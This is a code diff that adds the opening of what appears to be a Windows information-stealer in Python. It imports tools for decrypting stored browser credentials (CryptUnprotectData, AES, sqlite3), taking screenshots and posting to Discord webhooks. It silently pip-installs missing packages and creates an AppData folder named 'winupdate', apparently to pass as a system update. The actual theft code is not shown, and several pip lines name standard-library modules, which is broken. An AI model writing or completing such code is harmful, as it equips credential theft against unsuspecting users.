@@ -1,3 +1,39 @@
+# datetime, dhooks, mss
+try:
+    import os
+    import subprocess
+    from sqlite3 import connect, OperationalError
+    from wmi import WMI
+    import sys
+    from zipfile import ZipFile
+    from re import findall, search
+    from win32crypt import CryptUnprotectData
+    from json import loads
+    from base64 import b64decode
+    from shutil import copyfile, rmtree
+    from requests import get
+    from Crypto.Cipher import AES
+    from datetime import datetime, timedelta
+    from dhooks import Webhook, File, Embed
+    from mss import mss
+    import requests
+except:
+    import os
+    os.system("pip install subprocess")
+    os.system("pip install sqlite3")
+    os.system("pip install wmi")
+    os.system("pip install zipfile")
+    os.system("pip install re")
+    os.system("pip install win32crypt")
+    os.system("pip install json")
+    os.system("pip install base64")
+    os.system("pip install shutil")
+    os.system("pip install requests")
+    os.system("pip install pycryptodome")
+    os.system("pip install datetime")
+    os.system("pip install dhooks")
+    os.system("pip install mss")
+    
 try:
     os.mkdir(os.environ["appdata"] + "/winupdate")
 except:
